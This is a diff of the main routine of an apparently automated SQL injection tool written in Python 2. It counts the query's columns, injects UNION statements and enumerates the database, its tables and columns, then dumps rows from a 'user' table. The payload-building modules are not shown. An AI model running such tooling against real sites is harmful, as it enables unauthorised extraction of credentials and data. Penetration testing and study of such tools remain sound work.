@@ -28,36 +28,39 @@ if __name__ == '__main__':
     # Instantiate classes used
     build = builder.Builder(page, mysql_params)
     store = datastore.Store()
-    fang = injector.Injector("")
+    fang = injector.Injector(page, "")
     report = reporter.Reporter()
     parse = parser.Parser(store)
 
-    # Get column data
+    # Get column data for union statement
     print '\n### Basic Page Structure ###'
-    num_columns = fang.get_num_columns(page) 
+    num_columns = fang.get_num_columns() 
     report.columns_in_statement(num_columns)
-    magic_num = int(fang.get_visible_param(page))
+    magic_num = int(fang.get_visible_param())
     print '\tMagic Param','\t', magic_num
 
-    # Get DB data
+    # Get DB params
     print '\n### Basic DB Info ###'
-    data = fang.injection(page, build.union(num_columns, magic_num)) 
-    report.db_info(parse.db_values(data))
+    data = fang.injection(build.union(num_columns, magic_num)) 
+    report.db_info(parse.params(data))
+
+    # Get tables
     print '### Interesting Tables ###'
-    data = fang.injection(page, build.schema_union(num_columns, magic_num)) 
-    report.tables(parse.information_schema(data))
+    data = fang.injection(build.tables(num_columns, magic_num)) 
+    report.tables(parse.tables(data))
 
-    # Get table data
-    print '\n### DB Table Info ###'
-    data = fang.injection(page, build.columns(num_columns, magic_num)) 
-    report.columns(parse.table_for_columns(data))
-    x = build.values(num_columns, magic_num, 'user', ['user_username', 'user_password'])
-    data = fang.injection(page, x)
+    # Get columns
+    print '\n### DB Table Columns ###'
+    data = fang.injection(build.columns(num_columns, magic_num)) 
+    report.columns(parse.columns(data))
+
+    # Get rows
+    data = parse.columns(data)
+    x = build.rows(num_columns, magic_num, 'user', data)
+    data = fang.injection(x)
     print data
-    #print parse.columns_for_rows(data)
+    #print parse.rows(data)
     #report.XXX(parse.XXX(data))
-
-
-
+        
 
 
